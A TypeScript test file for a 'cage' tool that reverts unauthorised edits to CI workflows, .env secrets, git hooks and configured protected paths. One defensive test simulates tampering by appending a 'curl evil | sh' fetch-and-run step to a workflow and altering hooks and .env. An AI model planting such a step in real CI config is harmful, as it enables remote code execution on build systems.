import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { spawnSync } from "node:child_process";
import { getRepoRoot, gitChildEnv } from "../lib/git/git.js";
import { runCage } from "../lib/cage/cage-run.js";
import { buildCagePlan, cageBasenameRule, classifyCagePath } from "../lib/cage/cage-rules.js";
import { cageGlobToRegExp } from "../lib/cage/cage-config.js";
import { CAGE_MAX_SCAN_BYTES, CAGE_MAX_TARGETS } from "../lib/cage/cage-snapshot.js";
import { CAGE_LIMITS, CAGE_LIMITS_SUMMARY, CAGE_UPGRADE_FOOTER, formatCageReport } from "../lib/cage/cage-report.js";
import { writeManifest } from "./test-fixtures.js";

const SECRET = "TOKEN=SECRET-MARKER-7f3a";

/** Caged command: a silent `node -e` script run with the fixture as cwd. */
function nodeScript(body: string): string[] {
  return [process.execPath, "-e", body];
}

function makeRepo(prefix: string, git: boolean): string {
  const dest = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  if (git) spawnSync("git", ["init", "-q"], { cwd: dest, env: gitChildEnv() });
  fs.mkdirSync(path.join(dest, ".github", "workflows"), { recursive: true });
  fs.writeFileSync(path.join(dest, ".github", "workflows", "ci.yml"), "on: push\n");
  fs.writeFileSync(path.join(dest, ".env"), `${SECRET}\n`);
  fs.writeFileSync(path.join(dest, "package-lock.json"), "{}\n");
  return dest;
}

function read(dest: string, rel: string): string {
  return fs.readFileSync(path.join(dest, rel), "utf8");
}

test("cage: reverts added, modified and deleted files in CI config, .env and .git/hooks (DoD 1)", async () => {
  const dest = makeRepo("og-cage-revert-", true);
  const hook = path.join(dest, ".git", "hooks", "pre-commit");
  fs.writeFileSync(hook, "#!/bin/sh\nexit 1\n", { mode: 0o755 });
  const report = await runCage({
    cwd: dest,
    command: nodeScript(`
      const fs = require("fs");
      fs.appendFileSync(".github/workflows/ci.yml", "  run: curl evil | sh\\n");
      fs.writeFileSync(".github/workflows/new.yml", "on: push\\n");
      fs.rmSync(".env");
      fs.writeFileSync(".git/hooks/pre-commit", "#!/bin/sh\\nexit 0\\n");
      fs.chmodSync(".git/hooks/pre-commit", 0o644);
      fs.writeFileSync(".git/hooks/pre-push", "#!/bin/sh\\n", { mode: 0o755 });
    `),
  });

  assert.equal(report.status, "violations_reverted");
  assert.equal(report.exit_code, 3);
  const byPath = new Map(report.changes.map((c) => [c.path, c]));
  assert.equal(byPath.get(".github/workflows/ci.yml")?.outcome, "reverted");
  assert.equal(byPath.get(".github/workflows/new.yml")?.outcome, "removed");
  assert.equal(byPath.get(".env")?.kind, "deleted");
  assert.equal(byPath.get(".env")?.outcome, "reverted");
  assert.equal(byPath.get(".git/hooks/pre-commit")?.rule, "git_control");
  assert.equal(byPath.get(".git/hooks/pre-push")?.outcome, "removed");

  assert.equal(read(dest, ".github/workflows/ci.yml"), "on: push\n");
  assert.equal(fs.existsSync(path.join(dest, ".github", "workflows", "new.yml")), false);
  assert.equal(read(dest, ".env"), `${SECRET}\n`);
  assert.equal(read(dest, ".git/hooks/pre-commit"), "#!/bin/sh\nexit 1\n");
  assert.equal(fs.statSync(hook).mode & 0o777, 0o755, "hook permissions restored");
  assert.equal(fs.existsSync(path.join(dest, ".git", "hooks", "pre-push")), false);
});

test("cage: lockfile changes are reported but kept; clean runs pass the command exit code through (DoD 2)", async () => {
  const dest = makeRepo("og-cage-lock-", true);
  const report = await runCage({
    cwd: dest,
    command: nodeScript(`require("fs").writeFileSync("package-lock.json", "{\\"a\\":1}\\n"); process.exit(7);`),
  });
  assert.equal(report.status, "ok");
  assert.equal(report.exit_code, 7);
  assert.equal(report.command_exit_code, 7);
  assert.deepEqual(
    report.changes.map((c) => [c.path, c.rule, c.outcome]),
    [["package-lock.json", "lockfile", "kept"]],
  );
  assert.equal(read(dest, "package-lock.json"), "{\"a\":1}\n");
});

test("cage: files over the in-memory size cap are detect-only and not restored (DoD 3)", async () => {
  const dest = makeRepo("og-cage-cap-", false);
  fs.writeFileSync(path.join(dest, ".env.production"), "X".repeat(4096));
  const report = await runCage({
    cwd: dest,
    maxFileBytes: 1024,
    command: nodeScript(`require("fs").writeFileSync(".env.production", "Y".repeat(4096));`),
  });
  assert.equal(report.status, "violations_unresolved");
  assert.equal(report.exit_code, 3);
  assert.deepEqual(
    report.changes.map((c) => [c.path, c.outcome]),
    [[".env.production", "detect_only"]],
  );
  assert.notEqual(report.changes[0]!.sha256_before, report.changes[0]!.sha256_after);
  assert.equal(read(dest, ".env.production"), "Y".repeat(4096));
  assert.ok(formatCageReport(report).some((l) => l.includes("per-file cap or the total snapshot budget")));
});

test("cage: a small file past the total snapshot budget is detect-only too (DoD 3)", async () => {
  const dest = makeRepo("og-cage-budget-", false);
  // Budget fits nothing beyond the first few bytes; .env (well under the per-file cap) gets no baseline.
  const report = await runCage({
    cwd: dest,
    maxTotalBytes: 4,
    command: nodeScript(`require("fs").writeFileSync(".env", "TOKEN=changed\\n");`),
  });
  assert.equal(report.status, "violations_unresolved");
  assert.deepEqual(
    report.changes.map((c) => [c.path, c.outcome]),
    [[".env", "detect_only"]],
  );
  assert.ok(report.max_file_bytes > 1024, "per-file cap was not the cause");
  assert.equal(read(dest, ".env"), "TOKEN=changed\n");
});

test("cage: --report-only detects and fails without reverting", async () => {
  const dest = makeRepo("og-cage-report-only-", false);
  const report = await runCage({
    cwd: dest,
    reportOnly: true,
    command: nodeScript(`require("fs").writeFileSync(".env", "TOKEN=changed\\n");`),
  });
  assert.equal(report.status, "violations_unresolved");
  assert.equal(report.revert_mode, "report_only");
  assert.equal(report.changes[0]?.outcome, "reported");
  assert.equal(read(dest, ".env"), "TOKEN=changed\n");
});

test("cage: .env.example is not protected; .env.* and nested lockfiles are", () => {
  assert.equal(cageBasenameRule(".env.example"), null);
  assert.equal(cageBasenameRule(".env.local"), "secrets");
  assert.equal(cageBasenameRule(".env"), "secrets");
  assert.equal(cageBasenameRule("Cargo.lock"), "lockfile");
  assert.equal(cageBasenameRule("environment.ts"), null);
});

test("cage: unions manifest forbidden_zones into the protected set (DoD 5)", async () => {
  const dest = makeRepo("og-cage-manifest-", true);
  writeManifest(dest, {
    app: { trust_threshold: "Tier-2", tmvc_roots: ["src/"], forbidden_zones: ["infra/"] },
  });
  fs.mkdirSync(path.join(dest, "infra"), { recursive: true });
  fs.writeFileSync(path.join(dest, "infra", "main.tf"), "resource {}\n");
  const report = await runCage({
    cwd: dest,
    command: nodeScript(`require("fs").writeFileSync("infra/main.tf", "");`),
  });
  assert.equal(report.manifest_zones, 1);
  assert.deepEqual(
    report.changes.map((c) => [c.path, c.rule, c.outcome]),
    [["infra/main.tf", "manifest_forbidden_zone", "reverted"]],
  );
  assert.equal(read(dest, "infra/main.tf"), "resource {}\n");
});

test("cage: an invalid manifest fails closed before the command runs", async () => {
  const dest = makeRepo("og-cage-bad-manifest-", true);
  fs.mkdirSync(path.join(dest, ".gitagent", "foreman"), { recursive: true });
  fs.writeFileSync(path.join(dest, ".gitagent", "foreman", "MANIFEST.json"), "{}");
  await assert.rejects(
    runCage({ cwd: dest, command: nodeScript(`require("fs").writeFileSync("ran.txt", "1");`) }),
    /MANIFEST/,
  );
  assert.equal(fs.existsSync(path.join(dest, "ran.txt")), false);
});

test("cage CLI: zero-config in a non-git dir; --json report carries digests only, no file bodies (DoD 4, DoD 5)", () => {
  const cli = path.join(getRepoRoot(), "dist", "cli", "index.js");
  const dest = makeRepo("og-cage-cli-", false);
  const r = spawnSync(
    process.execPath,
    [cli, "cage", "--json", "--", ...nodeScript(`require("fs").writeFileSync(".env", "TOKEN=SECRET-MARKER-new\\n");`)],
    { cwd: dest, encoding: "utf8", env: gitChildEnv() },
  );
  assert.equal(r.status, 3, r.stderr);
  assert.ok(!r.stdout.includes("SECRET-MARKER"), "no file bodies in the JSON report");
  assert.ok(!r.stderr.includes("SECRET-MARKER"), "no file bodies on stderr");
  const report = JSON.parse(r.stdout) as { report_schema: string; root: string; changes: Record<string, unknown>[] };
  assert.equal(report.report_schema, "gantry.cage-report.v1");
  assert.equal(fs.realpathSync(report.root), fs.realpathSync(dest));
  assert.deepEqual(Object.keys(report.changes[0]!).sort(), [
    "error_code",
    "kind",
    "outcome",
    "overridden",
    "path",
    "rule",
    "sha256_after",
    "sha256_before",
    "source",
  ]);
  assert.match(String(report.changes[0]!.sha256_before), /^[0-9a-f]{64}$/);
  assert.equal(read(dest, ".env"), `${SECRET}\n`);
});

test("cage CLI: missing command fails", () => {
  const cli = path.join(getRepoRoot(), "dist", "cli", "index.js");
  const r = spawnSync(process.execPath, [cli, "cage", "--"], { encoding: "utf8" });
  assert.notEqual(r.status, 0);
});

test("opengantry-cage bin: package.json alias runs the same cage and reverts", () => {
  const ogRoot = getRepoRoot();
  const pkg = JSON.parse(fs.readFileSync(path.join(ogRoot, "package.json"), "utf8")) as { bin: Record<string, string> };
  assert.equal(pkg.bin["opengantry-cage"], "dist/cli/cage-bin.js");
  const bin = path.join(ogRoot, pkg.bin["opengantry-cage"]!);
  const dest = makeRepo("og-cage-bin-", true);
  const r = spawnSync(
    process.execPath,
    [bin, "--", ...nodeScript(`require("fs").appendFileSync(".github/workflows/ci.yml", "evil\\n");`)],
    { cwd: dest, encoding: "utf8", env: gitChildEnv() },
  );
  assert.equal(r.status, 3, r.stderr);
  assert.match(r.stderr, /cage: violations_reverted/);
  assert.equal(read(dest, ".github/workflows/ci.yml"), "on: push\n");
});

test("cage report: violations end with the upgrade footer; ok runs and --json carry none (MSN-0235 DoD 1)", async () => {
  const bad = await runCage({
    cwd: makeRepo("og-cage-footer-bad-", false),
    command: nodeScript(`require("fs").writeFileSync(".env", "TOKEN=changed\\n");`),
  });
  const badLines = formatCageReport(bad);
  assert.equal(bad.exit_code, 3);
  assert.equal(badLines.at(-1), `cage: ${CAGE_UPGRADE_FOOTER}`);
  assert.match(CAGE_UPGRADE_FOOTER, /npx -p @jeger-ai\/opengantry gantry init/);
  assert.ok(!JSON.stringify(bad).includes(CAGE_UPGRADE_FOOTER), "footer is human output only");

  const ok = await runCage({ cwd: makeRepo("og-cage-footer-ok-", false), command: nodeScript("") });
  assert.equal(ok.status, "ok");
  assert.ok(!formatCageReport(ok).some((l) => l.includes(CAGE_UPGRADE_FOOTER)));
});

test("cage report: stderr limits are one compact line; --json keeps the full list (MSN-0235 DoD 2)", async () => {
  // --no-watch: the after-exit limits this test was written for; watch-mode limits are covered in cage-watch.test.ts.
  const report = await runCage({ cwd: makeRepo("og-cage-limits-", false), command: nodeScript(""), watch: false });
  const limitLines = formatCageReport(report).filter((l) => l.includes("limits:"));
  assert.deepEqual(limitLines, [`cage: exit 0; limits: ${CAGE_LIMITS_SUMMARY}`]);
  assert.ok(limitLines[0]!.length < 120, `limits line is ${String(limitLines[0]!.length)} chars`);
  assert.deepEqual(report.limits, CAGE_LIMITS);
  assert.equal(report.limits.length, 5);
});

// ---- MSN-0239: additive .cage.yaml and --allow-override ----

function writeFile(dest: string, rel: string, body: string): void {
  fs.mkdirSync(path.dirname(path.join(dest, rel)), { recursive: true });
  fs.writeFileSync(path.join(dest, rel), body);
}

function runCli(dest: string, args: string[]): ReturnType<typeof spawnSync> & { stdout: string; stderr: string } {
  const cli = path.join(getRepoRoot(), "dist", "cli", "index.js");
  return spawnSync(process.execPath, [cli, "cage", ...args], { cwd: dest, encoding: "utf8", env: gitChildEnv() }) as never;
}

const CAGE_YAML = [
  "protect:",
  "  - path: infra/",
  "  - glob: \"**/*.pem\"",
  "  - path: docs/generated.md",
  "    mode: report",
  "",
].join("\n");

test("cage .cage.yaml: protect paths and globs are added to the built-in set; report entries are kept (MSN-0239 DoD 1)", async () => {
  const dest = makeRepo("og-cage-yaml-", true);
  writeFile(dest, ".cage.yaml", CAGE_YAML);
  writeFile(dest, "infra/main.tf", "resource {}\n");
  writeFile(dest, "deep/a/b/server.pem", "KEY\n");
  writeFile(dest, "docs/generated.md", "v1\n");
  writeFile(dest, "src/app.ts", "x\n");
  const report = await runCage({
    cwd: dest,
    watch: false,
    command: nodeScript(`
      const fs = require("fs");
      fs.writeFileSync("infra/main.tf", "resource { evil }\\n");
      fs.writeFileSync("infra/new.tf", "x\\n");
      fs.writeFileSync("deep/a/b/server.pem", "EVIL\\n");
      fs.writeFileSync("top.pem", "NEW\\n");
      fs.writeFileSync("docs/generated.md", "v2\\n");
      fs.writeFileSync("src/app.ts", "y\\n");
    `),
  });
  assert.deepEqual(report.cage_config, { present: true, entries: 3 });
  assert.equal(report.status, "violations_reverted");
  assert.deepEqual(
    report.changes.map((c) => [c.path, c.rule, c.source, c.outcome]),
    [
      ["deep/a/b/server.pem", "cage_protect", "cage_yaml", "reverted"],
      ["docs/generated.md", "cage_protect", "cage_yaml", "kept"],
      ["infra/main.tf", "cage_protect", "cage_yaml", "reverted"],
      ["infra/new.tf", "cage_protect", "cage_yaml", "removed"],
      ["top.pem", "cage_protect", "cage_yaml", "removed"],
    ],
  );
  assert.equal(read(dest, "infra/main.tf"), "resource {}\n");
  assert.equal(read(dest, "deep/a/b/server.pem"), "KEY\n");
  assert.equal(read(dest, "docs/generated.md"), "v2\n");
  assert.equal(read(dest, "src/app.ts"), "y\n", "paths outside the protected set are not touched");

  const zeroConfig = await runCage({ cwd: makeRepo("og-cage-noyaml-", true), watch: false, command: nodeScript("") });
  assert.deepEqual(zeroConfig.cage_config, { present: false, entries: 0 });
  assert.deepEqual(zeroConfig.overrides, []);
});

test("cage .cage.yaml: globs keep * inside one segment and ** across segments (MSN-0239 DoD 1)", () => {
  const pem = cageGlobToRegExp("**/*.pem");
  assert.ok(pem.test("a.pem") && pem.test("x/y/a.pem"));
  assert.ok(!pem.test("a.pem.bak"));
  const one = cageGlobToRegExp("k8s/*.yaml");
  assert.ok(one.test("k8s/prod.yaml"));
  assert.ok(!one.test("k8s/prod/app.yaml"));
  assert.ok(cageGlobToRegExp("db/migrations/**").test("db/migrations/2026/001.sql"));
  assert.ok(!cageGlobToRegExp("a.b").test("axb"), "regex metacharacters are literal");
});

const BAD_CONFIGS: readonly [string, string, RegExp][] = [
  ["invalid YAML", "protect: [\n", /invalid YAML/],
  ["unknown top-level key", "protect: []\nextra: 1\n", /unknown key "extra"/],
  ["subtractive top-level key", "relax:\n  - .env\n", /"relax" would remove protection/],
  ["subtractive entry key", "protect:\n  - path: infra\n    exclude: infra/ok\n", /"exclude" would remove protection/],
  ["unknown entry key", "protect:\n  - path: infra\n    when: always\n", /unknown key "when"/],
  ["plain string entry", "protect:\n  - infra\n", /expected a mapping/],
  ["path and glob together", "protect:\n  - path: a\n    glob: b\n", /exactly one of path: or glob:/],
  ["absolute path", "protect:\n  - path: /etc/passwd\n", /root-relative/],
  ["parent path", "protect:\n  - path: ../outside\n", /root-relative/],
  ["bad mode", "protect:\n  - path: infra\n    mode: ignore\n", /mode must be revert or report/],
  ["report on built-in secrets", "protect:\n  - path: .env\n    mode: report\n", /would weaken the built-in secrets rule/],
  ["report on built-in CI", "protect:\n  - path: .github/workflows/ci.yml\n    mode: report\n", /built-in ci_config rule/],
  ["aliases", "a: &x [1]\nprotect: *x\n", /invalid YAML: Alias resolution is disabled/],
];

test("cage .cage.yaml: invalid, unknown or subtractive config fails closed before the command runs (MSN-0239 DoD 2)", async () => {
  for (const [name, body, pattern] of BAD_CONFIGS) {
    const dest = makeRepo("og-cage-badyaml-", true);
    writeFile(dest, ".cage.yaml", body);
    await assert.rejects(
      runCage({ cwd: dest, command: nodeScript(`require("fs").writeFileSync("ran.txt", "1");`) }),
      (err: Error & { exitCode?: number; code?: string }) =>
        pattern.test(err.message) && err.exitCode === 2 && err.code === "GXT_CAGE_CONFIG_INVALID",
      name,
    );
    assert.equal(fs.existsSync(path.join(dest, "ran.txt")), false, `${name}: command must not run`);
  }
  const dest = makeRepo("og-cage-badyaml-cli-", true);
  writeFile(dest, ".cage.yaml", "relax:\n  - .env\n");
  const r = runCli(dest, ["--", ...nodeScript(`require("fs").writeFileSync("ran.txt", "1");`)]);
  assert.equal(r.status, 2, r.stderr);
  assert.match(r.stderr, /\[GXT_CAGE_CONFIG_INVALID\].*subtractive keys are not allowed/);
  assert.equal(fs.existsSync(path.join(dest, "ran.txt")), false);
});

test("cage .cage.yaml: the config protects itself; edits are restored and a new file is removed (MSN-0239 DoD 3)", async () => {
  const dest = makeRepo("og-cage-selfprot-", true);
  writeFile(dest, ".cage.yaml", CAGE_YAML);
  const edited = await runCage({
    cwd: dest,
    watchIntervalMs: 40,
    bell: () => {},
    command: nodeScript(`
      const fs = require("fs");
      fs.writeFileSync(".cage.yaml", "protect: []\\n");
      Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 600);
      fs.writeFileSync("probe.txt", fs.readFileSync(".cage.yaml", "utf8"));
    `),
  });
  assert.equal(read(dest, "probe.txt"), CAGE_YAML, "restored while the command was still running");
  assert.equal(read(dest, ".cage.yaml"), CAGE_YAML);
  const row = edited.changes.find((c) => c.path === ".cage.yaml");
  assert.deepEqual([row?.rule, row?.source, row?.outcome], ["cage_config", "builtin", "reverted"]);

  const fresh = makeRepo("og-cage-selfnew-", true);
  const created = await runCage({
    cwd: fresh,
    watch: false,
    command: nodeScript(`require("fs").writeFileSync(".cage.yaml", "protect:\\n  - path: src\\n");`),
  });
  assert.equal(fs.existsSync(path.join(fresh, ".cage.yaml")), false);
  assert.deepEqual(
    created.changes.map((c) => [c.path, c.rule, c.outcome]),
    [[".cage.yaml", "cage_config", "removed"]],
  );
});

test("cage caps: a protected set over the file or byte cap aborts before the command runs (MSN-0239 DoD 4)", async () => {
  assert.equal(CAGE_MAX_TARGETS, 5000);
  assert.equal(CAGE_MAX_SCAN_BYTES, 64 * 1024 * 1024);
  const dest = makeRepo("og-cage-caps-", true);
  writeFile(dest, ".cage.yaml", "protect:\n  - glob: \"**/*.dat\"\n");
  for (let i = 0; i < 6; i += 1) writeFile(dest, `data/f${String(i)}.dat`, "x".repeat(1000));
  const ran = path.join(dest, "ran.txt");
  const command = nodeScript(`require("fs").writeFileSync("ran.txt", "1");`);
  await assert.rejects(runCage({ cwd: dest, command, maxTargets: 4 }), (err: Error & { exitCode?: number; code?: string }) => {
    assert.equal(err.code, "GXT_CAGE_LIMITS_EXCEEDED");
    assert.match(err.message, /protected set too large: \d+ file\(s\), [\d.]+ MiB \(limits 4 files/);
    assert.ok(Number(/(\d+) file\(s\)/.exec(err.message)![1]) >= 9, "counts the whole set, not the first overflow");
    return err.exitCode === 2;
  });
  await assert.rejects(runCage({ cwd: dest, command, maxScanBytes: 3000 }), /protected set too large/);
  assert.equal(fs.existsSync(ran), false);
  const ok = await runCage({ cwd: dest, command, watch: false });
  assert.equal(ok.status, "ok", "default caps leave a normal repo alone");
});

test("cage --allow-override: downgrades a revert rule to report, announced at start and exit and in JSON (MSN-0239 DoD 5)", () => {
  const dest = makeRepo("og-cage-override-", true);
  const r = runCli(dest, [
    "--json",
    "--allow-override",
    ".env",
    "--",
    ...nodeScript(`require("fs").writeFileSync(".env", "TOKEN=kept\\n");`),
  ]);
  assert.equal(r.status, 0, r.stderr);
  const banner = "cage: OVERRIDE (--allow-override): changes are reported, not restored, under: .env";
  assert.equal(r.stderr.split("\n").filter((l) => l === banner).length, 1, "start banner with --json");
  const report = JSON.parse(r.stdout) as { overrides: string[]; status: string; changes: Record<string, unknown>[] };
  assert.deepEqual(report.overrides, [".env"]);
  assert.equal(report.status, "ok");
  assert.deepEqual(
    report.changes.map((c) => [c.path, c.rule, c.overridden, c.outcome]),
    [[".env", "secrets", true, "kept"]],
  );
  assert.equal(read(dest, ".env"), "TOKEN=kept\n");

  const human = runCli(makeRepo("og-cage-override-h-", true), ["--allow-override", ".env", "--", ...nodeScript("")]);
  assert.equal(human.stderr.split("\n").filter((l) => l === banner).length, 2, "banner at start and in the exit summary");
});

test("cage --allow-override: refused for git control, .cage.yaml and unprotected paths (MSN-0239 DoD 5)", () => {
  const cases: readonly [string, RegExp][] = [
    [".git/config", /git_control rules cannot be overridden/],
    [".git", /git_control rules cannot be overridden/],
    [".cage.yaml", /cage_config rules cannot be overridden/],
    ["src/app.ts", /matches no protected revert target/],
    ["package-lock.json", /matches no protected revert target/],
    ["../elsewhere", /root-relative/],
  ];
  for (const [p, pattern] of cases) {
    const dest = makeRepo("og-cage-override-bad-", true);
    const r = runCli(dest, ["--allow-override", p, "--", ...nodeScript(`require("fs").writeFileSync("ran.txt", "1");`)]);
    assert.equal(r.status, 2, `${p}: ${r.stderr}`);
    assert.match(r.stderr, pattern, p);
    assert.match(r.stderr, /\[GXT_CAGE_OVERRIDE_INVALID\]/, p);
    assert.equal(fs.existsSync(path.join(dest, "ran.txt")), false, `${p}: command must not run`);
  }
  const dest = makeRepo("og-cage-override-dir-", true);
  assert.deepEqual(buildCagePlan(dest, { overrides: [".github/"] }).overrides, [".github"], "parent dir of a target is accepted");
});

test("cage sources: plan targets and report rows say builtin, manifest or cage_yaml (MSN-0239 DoD 6)", async () => {
  const dest = makeRepo("og-cage-sources-", true);
  writeManifest(dest, { app: { trust_threshold: "Tier-2", tmvc_roots: ["src/"], forbidden_zones: ["infra/"] } });
  writeFile(dest, "infra/main.tf", "x\n");
  writeFile(dest, ".cage.yaml", "protect:\n  - path: terraform\n  - glob: \"*.pem\"\n");
  writeFile(dest, "terraform/main.tf", "x\n");
  const plan = buildCagePlan(dest);
  for (const t of plan.targets) assert.ok(["builtin", "manifest", "cage_yaml"].includes(t.source), t.abs);
  assert.ok(plan.targets.some((t) => t.source === "manifest" && t.rule === "manifest_forbidden_zone"));
  assert.ok(plan.targets.some((t) => t.source === "cage_yaml" && t.rule === "cage_protect"));
  assert.deepEqual(plan.globs.map((g) => [g.pattern, g.source]), [["*.pem", "cage_yaml"]]);

  const report = await runCage({
    cwd: dest,
    watch: false,
    command: nodeScript(`
      const fs = require("fs");
      for (const f of [".env", "infra/main.tf", "terraform/main.tf"]) fs.writeFileSync(f, "changed\\n");
    `),
  });
  assert.deepEqual(
    report.changes.map((c) => [c.path, c.source]),
    [[".env", "builtin"], ["infra/main.tf", "manifest"], ["terraform/main.tf", "cage_yaml"]],
  );
  assert.equal(classifyCagePath(plan, "x/y.pem"), null, "single * does not cross directories");
});
